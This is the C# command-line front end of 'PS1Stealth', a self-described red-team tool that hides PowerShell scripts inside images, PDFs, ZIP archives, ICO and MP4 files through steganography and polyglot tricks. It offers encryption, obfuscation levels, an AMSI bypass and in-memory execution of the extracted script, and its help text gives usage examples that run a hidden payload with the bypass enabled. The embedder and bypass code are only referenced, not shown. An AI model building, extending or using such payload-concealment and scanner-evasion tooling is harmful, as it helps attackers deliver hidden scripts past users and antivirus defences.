using System;
using System.CommandLine;
using System.CommandLine.Invocation;
using PS1Stealth.Core;
using PS1Stealth.Embedders;
using PS1Stealth.Executors;

namespace PS1Stealth;

class Program
{
    static async Task<int> Main(string[] args)
    {
        var rootCommand = new RootCommand("PS1Stealth - Advanced PowerShell Payload Embedding Tool");
        rootCommand.Description = @"
═══════════════════════════════════════════════════════════
  PS1Stealth - Red Team PowerShell Obfuscation Framework
═══════════════════════════════════════════════════════════
  
  Embed PowerShell scripts into various file formats using
  polyglot techniques, steganography, and binary manipulation.
  
  WARNING: For authorized security testing only!
═══════════════════════════════════════════════════════════
";

        // Embed command
        var embedCommand = CreateEmbedCommand();
        rootCommand.AddCommand(embedCommand);

        // Extract command
        var extractCommand = CreateExtractCommand();
        rootCommand.AddCommand(extractCommand);

        // Execute command
        var executeCommand = CreateExecuteCommand();
        rootCommand.AddCommand(executeCommand);

        // Info command
        var infoCommand = CreateInfoCommand();
        rootCommand.AddCommand(infoCommand);

        return await rootCommand.InvokeAsync(args);
    }

    static Command CreateEmbedCommand()
    {
        var command = new Command("embed", "Embed a PowerShell script into a carrier file");

        var ps1FileArg = new Argument<FileInfo>("ps1-file", "PowerShell script to embed");
        var carrierFileArg = new Argument<FileInfo>("carrier-file", "Carrier file (image, PDF, etc.)");
        var outputFileArg = new Argument<FileInfo>("output-file", "Output polyglot file");

        var methodOption = new Option<EmbedMethod>(
            "--method",
            () => EmbedMethod.ImageLSB,
            "Embedding method to use");

        var passwordOption = new Option<string>(
            "--password",
            "Encryption password (AES-256)");

        var compressionOption = new Option<bool>(
            "--compress",
            () => false,
            "Compress payload before embed ding (default: false)");

        var obfuscationOption = new Option<ObfuscationLevel>(
            "--obfuscate",
            () => ObfuscationLevel.None,
            "Obfuscation level (None, Light, Medium, Heavy)");

        var amsiBypassOption = new Option<bool>(
            "--amsi-bypass",
            () => false,
            "Add AMSI bypass to script");

        var inMemoryOption = new Option<bool>(
            "--in-memory",
            () => false,
            "Prepare script for in-memory execution");

        command.AddArgument(ps1FileArg);
        command.AddArgument(carrierFileArg);
        command.AddArgument(outputFileArg);
        command.AddOption(methodOption);
        command.AddOption(passwordOption);
        command.AddOption(compressionOption);
        command.AddOption(obfuscationOption);
        command.AddOption(amsiBypassOption);
        command.AddOption(inMemoryOption);

        command.SetHandler(async (context) => 
        {
            var ps1File = context.ParseResult.GetValueForArgument(ps1FileArg);
            var carrierFile = context.ParseResult.GetValueForArgument(carrierFileArg);
            var outputFile = context.ParseResult.GetValueForArgument(outputFileArg);
            var method = context.ParseResult.GetValueForOption(methodOption);
            var password = context.ParseResult.GetValueForOption(passwordOption);
            var compress = context.ParseResult.GetValueForOption(compressionOption);
            var obfuscate = context.ParseResult.GetValueForOption(obfuscationOption);
            var amsiBypass = context.ParseResult.GetValueForOption(amsiBypassOption);
            var inMemory = context.ParseResult.GetValueForOption(inMemoryOption);

            try
            {
                Console.WriteLine($"[*] Reading PowerShell script: {ps1File.Name}");
                var ps1Content = await File.ReadAllTextAsync(ps1File.FullName);

                Console.WriteLine($"[*] Reading carrier file: {carrierFile.Name}");
                var carrierData = await File.ReadAllBytesAsync(carrierFile.FullName);

                Console.WriteLine($"[*] Embedding method: {method}");
                
                if (obfuscate != ObfuscationLevel.None)
                {
                    Console.WriteLine($"[*] Obfuscation level: {obfuscate}");
                }
                
                if (amsiBypass)
                {
                    Console.WriteLine($"[*] AMSI bypass: Enabled");
                }
                
                if (inMemory)
                {
                    Console.WriteLine($"[*] In-memory execution: Prepared");
                }
                
                IEmbedder embedder = method switch
                {
                    EmbedMethod.ImageLSB => new ImageLSBEmbedder(),
                    EmbedMethod.ImagePolyglot => new ImagePolyglotEmbedder(),
                    EmbedMethod.PdfPolyglot => new PdfPolyglotEmbedder(),
                    EmbedMethod.ZipComment => new ZipCommentEmbedder(),
                    EmbedMethod.IcoAtom => new IcoAtomEmbedder(),
                    EmbedMethod.Mp4Atom => new Mp4AtomEmbedder(),
                    _ => throw new ArgumentException("Invalid embedding method")
                };

                var payload = new PayloadData
                {
                    ScriptContent = ps1Content,
                    Password = password,
                    UseCompression = compress,
                    ObfuscationLevel = obfuscate,
                    AddAMSIBypass = amsiBypass,
                    PrepareForInMemory = inMemory
                };

                Console.WriteLine($"[*] Processing payload...");
                var result = await embedder.EmbedAsync(carrierData, payload);

                Console.WriteLine($"[*] Writing output file: {outputFile.Name}");
                await File.WriteAllBytesAsync(outputFile.FullName, result);

                Console.WriteLine($"[+] Success! Polyglot file created: {outputFile.FullName}");
                Console.WriteLine($"[+] File size: {result.Length:N0} bytes");
                
                if (!string.IsNullOrEmpty(password))
                {
                    Console.WriteLine($"[+] Payload encrypted with AES-256");
                }
                
                if (obfuscate != ObfuscationLevel.None)
                {
                    Console.WriteLine($"[+] Script obfuscated ({obfuscate} level)");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                return;
            }
        });

        return command;
    }

    static Command CreateExtractCommand()
    {
        var command = new Command("extract", "Extract PowerShell script from polyglot file");

        var inputFileArg = new Argument<FileInfo>("input-file", "Polyglot file containing embedded script");
        var outputFileArg = new Argument<FileInfo>("output-file", "Output PowerShell script file");
        var methodOption = new Option<EmbedMethod>("--method", "Extraction method");
        var passwordOption = new Option<string>("--password", "Decryption password");

        command.AddArgument(inputFileArg);
        command.AddArgument(outputFileArg);
        command.AddOption(methodOption);
        command.AddOption(passwordOption);

        command.SetHandler(async (inputFile, outputFile, method, password) =>
        {
            try
            {
                Console.WriteLine($"[*] Reading polyglot file: {inputFile.Name}");
                var fileData = await File.ReadAllBytesAsync(inputFile.FullName);

                IEmbedder embedder = method switch
                {
                    EmbedMethod.ImageLSB => new ImageLSBEmbedder(),
                    EmbedMethod.ImagePolyglot => new ImagePolyglotEmbedder(),
                    EmbedMethod.PdfPolyglot => new PdfPolyglotEmbedder(),
                    EmbedMethod.ZipComment => new ZipCommentEmbedder(),
                    EmbedMethod.IcoAtom => new IcoAtomEmbedder(),
                    EmbedMethod.Mp4Atom => new Mp4AtomEmbedder(),
                    _ => throw new ArgumentException("Invalid extraction method")
                };

                Console.WriteLine($"[*] Extracting payload...");
                var script = await embedder.ExtractAsync(fileData, password);

                Console.WriteLine($"[*] Writing extracted script: {outputFile.Name}");
                await File.WriteAllTextAsync(outputFile.FullName, script);

                Console.WriteLine($"[+] Success! Script extracted to: {outputFile.FullName}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }, inputFileArg, outputFileArg, methodOption, passwordOption);

        return command;
    }

    static Command CreateExecuteCommand()
    {
        var command = new Command("execute", "Extract and execute PowerShell script in-memory");

        var inputFileArg = new Argument<FileInfo>("input-file", "Polyglot file");
        var methodOption = new Option<EmbedMethod>("--method", "Extraction method");
        var passwordOption = new Option<string>("--password", "Decryption password");
        var bypassAMSIOption = new Option<bool>("--bypass-amsi", () => false, "Attempt AMSI bypass");

        command.AddArgument(inputFileArg);
        command.AddOption(methodOption);
        command.AddOption(passwordOption);
        command.AddOption(bypassAMSIOption);

        command.SetHandler(async (inputFile, method, password, bypassAMSI) =>
        {
            try
            {
                Console.WriteLine($"[*] Reading polyglot file: {inputFile.Name}");
                var fileData = await File.ReadAllBytesAsync(inputFile.FullName);

                IEmbedder embedder = method switch
                {
                    EmbedMethod.ImageLSB => new ImageLSBEmbedder(),
                    EmbedMethod.ImagePolyglot => new ImagePolyglotEmbedder(),
                    EmbedMethod.PdfPolyglot => new PdfPolyglotEmbedder(),
                    EmbedMethod.ZipComment => new ZipCommentEmbedder(),
                    EmbedMethod.IcoAtom => new IcoAtomEmbedder(),
                    EmbedMethod.Mp4Atom => new Mp4AtomEmbedder(),
                    _ => throw new ArgumentException("Invalid extraction method")
                };

                Console.WriteLine($"[*] Extracting payload...");
                var script = await embedder.ExtractAsync(fileData, password);

                Console.WriteLine($"[*] Executing PowerShell in-memory...");
                var executor = new PowerShellExecutor();
                
                if (bypassAMSI)
                {
                    Console.WriteLine($"[*] Attempting AMSI bypass...");
                    executor.AttemptAMSIBypass();
                }

                var result = executor.ExecuteScript(script);

                Console.WriteLine($"\n[+] Execution completed");
                Console.WriteLine($"[+] Output:\n{result.Output}");
                
                if (!string.IsNullOrEmpty(result.Error))
                {
                    Console.WriteLine($"[!] Errors:\n{result.Error}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }, inputFileArg, methodOption, passwordOption, bypassAMSIOption);

        return command;
    }

    static Command CreateInfoCommand()
    {
        var command = new Command("info", "Display information about embedding methods");

        command.SetHandler(() =>
        {
            Console.WriteLine(@"
═══════════════════════════════════════════════════════════
  EMBEDDING METHODS
═══════════════════════════════════════════════════════════

1. ImageLSB (Least Significant Bit Steganography)
   - Hides data in image pixels
   - Visually imperceptible
   - Works with: PNG, BMP
   - Capacity: ~1 byte per 8 pixels

2. ImagePolyglot (Polyglot ICO+MP4)
   - Creates file that works as both image and data carrier
   - Inspired by beheader technique
   - Works with: ICO format
   - High capacity

3. PdfPolyglot (PDF Object Injection)
   - Embeds payload in PDF stream objects
   - File remains valid PDF
   - Works with: PDF documents
   - Medium capacity

4. ZipComment (ZIP Archive Comment)
   - Hides payload in ZIP comment field
   - Works with: ZIP, JAR, APK, DOCX, XLSX
   - Low to medium capacity

5. IcoAtom (ICO Header Manipulation)
   - Uses ICO reserved bytes and padding
   - Similar to MP4 atom technique
   - Works with: ICO files
   - Low capacity

6. Mp4Atom (MP4 Atom Injection) ⭐ NEW!
   - Hides payload in MP4 skip/free atoms
   - Beheader-inspired technique
   - Works with: MP4 video files
   - Video remains perfectly playable
   - High capacity

═══════════════════════════════════════════════════════════
  USAGE EXAMPLES
═══════════════════════════════════════════════════════════

# Embed script into image with encryption
PS1Stealth embed script.ps1 photo.png output.png --method ImageLSB --password MySecret123

# Embed script into MP4 video (NEW!)
PS1Stealth embed script.ps1 video.mp4 output.mp4 --method Mp4Atom --password MySecret123

# Extract from polyglot file
PS1Stealth extract output.png extracted.ps1 --method ImageLSB --password MySecret123

# Execute directly from polyglot file
PS1Stealth execute output.png --method ImageLSB --password MySecret123 --bypass-amsi

═══════════════════════════════════════════════════════════
");
        });

        return command;
    }
}

public enum EmbedMethod
{
    ImageLSB,
    ImagePolyglot,
    PdfPolyglot,
    ZipComment,
    IcoAtom,
    Mp4Atom
}
